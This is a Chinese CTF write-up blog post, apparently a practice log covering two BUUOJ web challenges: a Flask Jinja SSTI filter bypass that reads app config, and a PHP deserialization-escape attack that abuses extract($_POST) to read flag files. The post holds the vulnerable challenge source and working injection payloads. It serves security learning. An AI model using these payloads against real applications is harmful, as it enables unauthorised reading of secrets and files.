{"title":"BUUOJ刷题记录2020-12-14-21","uid":"c9ff35e68b84eedc69746ce24f3be94d","slug":"BUUOJ刷题记录2020-12-14-21","date":"2020-12-14T08:21:58.000Z","updated":"2020-12-17T05:22:14.000Z","comments":true,"path":"api/articles/BUUOJ刷题记录2020-12-14-21.json","keywords":"A1andNS","cover":[],"content":"<h2 id=\"WesternCTF2018-shrine\"><a href=\"#WesternCTF2018-shrine\" class=\"headerlink\" title=\"[WesternCTF2018]shrine\"></a>[WesternCTF2018]shrine</h2><p><strong>考点 ：代码审计、ssti</strong></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> flask\n<span class=\"token keyword\">import</span> os\n\napp <span class=\"token operator\">=</span> flask<span class=\"token punctuation\">.</span>Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span>\napp<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">[</span><span class=\"token string\">'FLAG'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>environ<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token string\">'FLAG'</span><span class=\"token punctuation\">)</span>\n@ app<span class=\"token punctuation\">.</span>route<span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n@ app<span class=\"token punctuation\">.</span>route<span class=\"token punctuation\">(</span><span class=\"token string\">'/shrine/'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">shrine</span><span class=\"token punctuation\">(</span>shrine<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">safe_jinja</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        s <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'('</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">')'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\n        blacklist <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'config'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'self'</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> blacklist<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> s\n    <span class=\"token keyword\">return</span> flask<span class=\"token punctuation\">.</span>render_template_string<span class=\"token punctuation\">(</span>safe_jinja<span class=\"token punctuation\">(</span>shrine<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>debug <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>审计代码可以看到</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">app<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">[</span><span class=\"token string\">'FLAG'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>environ<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token string\">'FLAG'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里是设置了一个名叫FLAG的config项，这应该就是我们要的flag，我们目的就是读取这个flag。</p>\n<p>接着往下看，/路由直接给出源代码，/shrine/路由会过滤左右括号，以及有一个黑名单，config和self都在其中，所以直接是不行了。所以看看有哪些内置变量函数，这里的url_for和get_flashed_messages都可以使用</p>\n<p>payload：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span>url_for<span class=\"token punctuation\">.</span>__globals__<span class=\"token punctuation\">[</span><span class=\"token string\">'current_app'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span>\n或\n<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span>get_flashed_messages<span class=\"token punctuation\">.</span>__globals__<span class=\"token punctuation\">[</span><span class=\"token string\">'current_app'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"安洵杯-2019-easy-serialize-php\"><a href=\"#安洵杯-2019-easy-serialize-php\" class=\"headerlink\" title=\"[安洵杯 2019]easy_serialize_php\"></a>[安洵杯 2019]easy_serialize_php</h2><p><strong>考点：代码审计,PHP反序列化逃逸</strong></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$img</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$filter_arr</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'php5'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'php4'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'fl1g'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$filter</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'|'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filter_arr</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/i'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filter</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"user\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'guest'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'function'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$function</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;a href=\"index.php?f=highlight_file\">source_code&lt;/a>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'img_path'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'img'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'guest_img.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'img'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'img_path'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$serialize_info</span> <span class=\"token operator\">=</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$function</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'highlight_file'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$function</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'phpinfo'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'phpinfo();'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//maybe you can find something in here!</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$function</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'show_image'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$userinfo</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$serialize_info</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$userinfo</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'img'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>看源码，按他的提示去看一下phpinfo，发现了一个文件 d0g3_f1ag.php。先来看看上面代码中的交互点：第一个是get类型的f参数，一个是GET类型的img_path参数。</p>\n<p>然后我们看看这里有一个session的序列化和反系列化。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$serialize_info</span> <span class=\"token operator\">=</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#对SESSION变量做序列化，然后在过滤一些内容</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$function</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'highlight_file'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$function</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'phpinfo'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'phpinfo();'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//maybe you can find something in here!</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$function</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'show_image'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">#当参数f传入的是show_image的时候就会执行反系列化</span>\n    <span class=\"token variable\">$userinfo</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$serialize_info</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$userinfo</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'img'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">#然后去读文件</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>之前做过替换后字母数量增加的，那题是把值闭合，让自己的攻击语句逃逸。这里我们要想办法把一些字符吃了才行，让我们构造的内容被反系列化。这里有一个extract($_POST);是一个利用点，我们可以通过传入post参数的session数组来传递payload。</p>\n<p>s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;是我们期望的img项的内容</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">a:2:&#123;s:7:&quot;&quot;;s:50:&quot;;s:3:&quot;xxx&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">_SESSION[flagphp]&#x3D;;s:3:&quot;xxx&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20201214214008.png\" alt=\"1\"></p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token comment\">&lt;!--?php\n\n$flag = 'flag in /d0g3_fllllllag';\n\n?--></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在网页源代码中看到提示</p>\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">_SESSION[flagphp]&#x3D;;s:3:&quot;xxx&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20201214214021.png\" alt=\"2\"></p>\n<h3 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h3><p>类似这样的序列化后过滤字符并且<strong>字符长度变短了</strong>的情况，可以考虑用被过滤字符构造一个键值对的键，以此来吞并键值对中值部分的序列化值，再构造一个与之配对的值，就可以实现我们的字符串的逃逸，并且挤掉不想要的原有值。</p>\n<p>而替换后<strong>字符个数变多</strong>的，则是通过把被过滤字符放在值的位置上，让字符增加挤占原来值的位置，让身为原来值的我们的payload被挤出来，从而构成攻击。</p>\n","text":"[WesternCTF2018]shrine考点 ：代码审计、ssti import flask import os app = flask.Flask(__name__) app.config['FLAG'] = os.environ.pop('FLAG') @ app.rou...","link":"","photos":[],"count_time":{"symbolsCount":"3.5k","symbolsTime":"3 mins."},"categories":[{"name":"CTF","slug":"CTF","count":41,"path":"api/categories/CTF.json"}],"tags":[{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#WesternCTF2018-shrine\"><span class=\"toc-text\">[WesternCTF2018]shrine</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php\"><span class=\"toc-text\">[安洵杯 2019]easy_serialize_php</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93%EF%BC%9A\"><span class=\"toc-text\">总结：</span></a></li></ol></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Redhat学习(五)","uid":"c993bcceaa8ff4a9e60b7e8c86bd0c0e","slug":"Redhat学习-五","date":"2020-12-15T08:12:52.000Z","updated":"2020-12-16T13:47:08.000Z","comments":true,"path":"api/articles/Redhat学习-五.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200601211235.jpg","text":"来看看redhat的防火墙管理工具，基本的Linux都会使用的防火墙。这里Redhat 7 中新增了firewalld防火墙，之前版本中都是iptables，现在很多Linux也开始使用firewalld了。 防火墙管理工具所谓防火墙，就是用来隔绝内网和外网的，部署在内网和公网之...","link":"","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[{"name":"Linux学习","slug":"Linux学习","count":7,"path":"api/categories/Linux学习.json"}],"tags":[{"name":"Linux","slug":"Linux","count":11,"path":"api/tags/Linux.json"},{"name":"Redhat","slug":"Redhat","count":5,"path":"api/tags/Redhat.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"BUU刷题20201207-20201214","uid":"534e07e0322b2e8867b8c55d490051f3","slug":"BUU刷题20201207-20201214","date":"2020-12-08T10:57:03.000Z","updated":"2021-02-02T09:07:00.842Z","comments":true,"path":"api/articles/BUU刷题20201207-20201214.json","keywords":"A1andNS","cover":[],"text":"[BJDCTF2020]Cookie is so stable考点：twig模板注入 hint.php文件里提示看看cookies,再cookie里的user处发现了一个ssti点，这里是PHP环境，所以就是PHP的ssti。这里通过测试是twig模板注入 payload: 得到...","link":"","photos":[],"count_time":{"symbolsCount":"1.6k","symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":41,"path":"api/categories/CTF.json"}],"tags":[{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"},{"name":"BJDCTF","slug":"BJDCTF","count":1,"path":"api/tags/BJDCTF.json"},{"name":"SWPU2019","slug":"SWPU2019","count":1,"path":"api/tags/SWPU2019.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}